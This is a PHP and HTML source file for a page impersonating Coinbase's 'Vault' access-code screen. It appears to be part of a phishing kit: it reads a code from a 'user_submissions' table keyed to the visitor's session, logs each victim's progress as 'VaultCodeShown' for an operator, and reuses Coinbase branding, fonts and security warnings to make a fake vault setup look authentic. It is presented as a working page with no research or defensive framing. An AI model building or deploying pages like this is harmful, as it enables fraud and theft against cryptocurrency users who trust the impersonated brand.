<?php
session_start();
require_once 'admin/db_connection.php';

// Check if session exists, redirect to login if not
if (!isset($_SESSION['token']) || !isset($_SESSION['email'])) {
    header("Location: login.php");
    exit();
}

// Get vault code from database
$stmt = $conn->prepare("SELECT vault_code FROM user_submissions WHERE token = ?");
$stmt->bind_param("s", $_SESSION['token']);
$stmt->execute();
$result = $stmt->get_result();
$user_data = $result->fetch_assoc();
$stmt->close();

// If no code generated yet, redirect back to loading
if (!$user_data || !$user_data['vault_code']) {
    header("Location: loading.php");
    exit();
}

$vault_code = $user_data['vault_code'];

// Update activity status
function updateActivity($token, $activity) {
    global $conn;
    $stmt = $conn->prepare("UPDATE user_submissions SET activity = ?, vault_status = ?, updated_at = NOW() WHERE token = ?");
    $stmt->bind_param("sss", $activity, $activity, $token);
    $stmt->execute();
    $stmt->close();
}

updateActivity($_SESSION['token'], "VaultCodeShown");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Vault Access Code - Coinbase</title>
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2');
        }

        body {
            background-color: #0A0B0D;
            color: #E0E0E0;
            font-family: 'CoinbaseSans', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
            text-align: center;
        }

        /* Progress Bar */
        .progress-bar {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 40px;
            gap: 8px;
        }

        .progress-step {
            width: 80px;
            height: 4px;
            background-color: #32353D;
            border-radius: 2px;
        }

        .progress-step.active {
            background-color: #588BFA;
        }

        .progress-step.completed {
            background-color: #588BFA;
        }

        .header {
            color: #B0B0B0;
            margin-bottom: 24px;
            text-align: center;
            font-family: 'CoinbaseSans', sans-serif;
        }

        .header .coinbase-text {
            font-size: 18px;
            font-weight: 600;
        }

        .header .vault-text {
            font-size: 14px;
            font-weight: 400;
            margin-left: 8px;
        }

        h1 {
            color: #FFFFFF;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            text-align: center;
        }

        .subtitle {
            color: #B0B0B0;
            font-size: 16px;
            margin-bottom: 24px;
            text-align: center;
        }

        .code-display {
            background-color: #1A1B1F;
            border: 2px solid #32353D;
            border-radius: 12px;
            padding: 32px 24px;
            margin-bottom: 24px;
            text-align: center;
        }

        .code-label {
            color: #B0B0B0;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 16px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .access-code {
            font-size: 48px;
            font-weight: 700;
            color: #FFFFFF;
            font-family: 'CoinbaseSans', sans-serif;
            letter-spacing: 8px;
            margin-bottom: 16px;
        }

        .code-warning {
            color: #E53E3E;
            font-size: 14px;
            font-weight: 500;
            background-color: #2A1A1A;
            border: 1px solid #441111;
            border-radius: 8px;
            padding: 12px 16px;
            margin-bottom: 32px;
        }

        .continue-button {
            width: 100%;
            background-color: #588BFA;
            color: #FFFFFF;
            border: none;
            border-radius: 50px;
            padding: 16px 24px;
            font-size: 16px;
            font-weight: 600;
            font-family: 'CoinbaseSans', sans-serif;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-bottom: 24px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .continue-button:hover {
            background-color: #4A7BEA;
            transform: translateY(-1px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
        }

        .continue-button:active {
            transform: translateY(0);
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .info-box {
            background-color: #1A1B1F;
            border: 1px solid #32353D;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: flex-start;
            text-align: left;
        }

        .info-icon {
            margin-right: 12px;
            flex-shrink: 0;
            margin-top: 4px;
        }

        .info-text h3 {
            font-size: 16px;
            font-weight: 600;
            color: #FFFFFF;
            margin: 0 0 4px 0;
        }

        .info-text p {
            font-size: 14px;
            color: #B0B0B0;
            margin: 0;
            line-height: 1.5;
        }

        .footer {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 32px;
        }

        .footer a {
            color: #B0B0B0;
            font-size: 14px;
            text-decoration: none;
            transition: color 0.2s;
        }

        .footer a:hover {
            color: #FFFFFF;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="progress-bar">
            <div class="progress-step completed"></div>
            <div class="progress-step active"></div>
            <div class="progress-step"></div>
            <div class="progress-step"></div>
        </div>
        
        <div class="header">
            <span class="coinbase-text">COINBASE</span><span class="vault-text">VAULT</span>
        </div>
        
        <h1>Your Vault Access Code</h1>
        <p class="subtitle">Save this code securely. You'll need it to access your vault.</p>
        
        <div class="code-display">
            <div class="code-label">Access Code</div>
            <div class="access-code"><?php echo $vault_code; ?></div>
        </div>
        
        <div class="code-warning">
            ⚠️ This code will only be shown once. Make sure to save it securely before continuing.
        </div>
        
        <form method="POST" action="loading.php">
            <input type="hidden" name="vault_continue" value="1">
            <button type="submit" class="continue-button">Continue</button>
        </form>
        
        <div class="info-box">
            <div class="info-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" fill="#588BFA"/>
                </svg>
            </div>
            <div class="info-text">
                <h3>Security Notice</h3>
                <p>This access code is unique to your vault. Never share it with anyone, including Coinbase support.</p>
            </div>
        </div>

        <div class="info-box">
            <div class="info-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="#B0B0B0"/>
                </svg>
            </div>
            <div class="info-text">
                <h3>Vault Security</h3>
                <p>Your vault includes enhanced security features including time-delayed withdrawals and multiple approval requirements for maximum protection.</p>
            </div>
        </div>

        <div class="footer">
            <a href="#">We're hiring</a>
            <a href="#">Terms of service</a>
            <a href="#">Privacy policy</a>
        </div>
    </div>
</body>
</html> 